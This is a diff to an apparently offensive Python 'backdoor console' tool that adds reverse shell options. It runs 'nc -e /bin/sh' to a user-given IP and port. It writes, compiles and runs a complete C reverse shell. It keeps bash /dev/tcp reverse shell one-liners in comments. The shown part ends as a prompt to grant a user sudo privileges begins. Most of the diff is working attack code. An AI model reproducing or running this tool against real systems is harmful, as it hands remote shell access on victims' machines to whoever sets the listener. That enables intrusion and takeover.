@@ -160,6 +160,8 @@ Welcome to the reverse shell console!
 
 bash {ip} {port} - will attempt to setup a reverse bash shell on that specific port and listening on that specific IP
 nc {ip} {port} - will attempt to setup a reverse netcat shell on that specific port
+py {ip} {port} - will attempt to setup a reverse python3 shell on that specific port
+C {ip} {port} - will attempt to setup a reverse C shell on that specific port
 
             ''')
             revCommand = input('\033[1;31;40m' + user + '\033[0m' + '\033[1;34;40m@Kh0p3sh-console\033[0m' + '\033[1;34;40m' + '/' + 'backdoor-console\033[0m' + '\033[1;34;40m' + '/' + 'reverse\033[0m' + '>')
@@ -168,9 +170,60 @@ nc {ip} {port} - will attempt to setup a reverse netcat shell on that specific p
                 print('you do not have enough arguments!')
                 revCommand = input('\033[1;31;40m' + user + '\033[0m' + '\033[1;34;40m@Kh0p3sh-console\033[0m' + '\033[1;34;40m' + '/' + 'backdoor-console\033[0m' + '\033[1;34;40m' + '/' + 'reverse\033[0m' + '>')
                 revCommand = str(revCommand).split()
-            if revCommand[0] == 'bash':
-                print('Attempting to create bash reverse shell to ' + revCommand[1] + 'on port ' + revCommand[2] + '...')
-        
+            # if revCommand[0] == 'bash':
+            #     print('Attempting to create bash reverse shell to ' + revCommand[1] + ' on port ' + revCommand[2] + '...')
+            #     # 0<&196;exec 196<>/dev/tcp/192.168.75.1/4444; sh <&196 >&196 2>&196
+            #     # bash -i >& /dev/tcp/192.168.75.1/4444 0>&1
+            #     # print('bash -i >& /dev/tcp/' + revCommand[1] + '/' + revCommand[2] + ' 0>&1')
+            #     os.system('bash -i >& /dev/tcp/{}/{} 0>&1'.format(revCommand[1], revCommand[2]))
+            if revCommand[0] == 'nc':
+                print('Attempting to create netcat reverse shell to ' + revCommand[1] + ' on port ' + revCommand[2] + '...')
+                os.system('nc -e /bin/sh {} {}'.format(revCommand[1], revCommand[2]))
+            # if revCommand[0] == 'py':
+            #     print('Attempting to create python reverse shell to ' + revCommand[1] + ' on port ' + revCommand[2] + '...')
+            #     os.system('nc -e /bin/sh {} {}'.format(revCommand[1], revCommand[2]))
+            if revCommand[0] == 'C':
+                print('Attempting to create C reverse shell to ' + revCommand[1] + ' on port ' + revCommand[2] + '...')
+                os.system('rm -rf back.c && touch back.c')
+                fle = open('back.c', 'w')
+                fle.write('''
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+
+
+int main(void){
+                ''')
+                fle.write('    int port = {};'.format(revCommand[2]))
+                fle.write(
+'''
+    struct sockaddr_in revsockaddr;
+
+    int sockt = socket(AF_INET, SOCK_STREAM, 0);
+    revsockaddr.sin_family = AF_INET;       
+    revsockaddr.sin_port = htons(port);
+''')
+                fle.write('''   revsockaddr.sin_addr.s_addr = inet_addr("{}");'''.format(revCommand[1]))
+                fle.write('''
+
+    connect(sockt, (struct sockaddr *) &revsockaddr, 
+    sizeof(revsockaddr));
+    dup2(sockt, 0);
+    dup2(sockt, 1);
+    dup2(sockt, 2);
+
+    char * const argv[] = {"/bin/sh", NULL};
+    execve("/bin/sh", argv, NULL);
+
+    return 0;       
+}               
+''')
+                fle.close()
+                os.system('gcc back.c --output shl && ./shl')
         if str(backCommand) == 'sudo':
             print('What user would you like to have sudo privileges?')
             sudoCommand = input('\033[1;31;40m' + user + '\033[0m' + '\033[1;34;40m@Kh0p3sh-console\033[0m' + '\033[1;34;40m' + '/' + 'backdoor-console\033[0m' + '\033[1;34;40m' + '/' + 'sudo\033[0m' + '>')
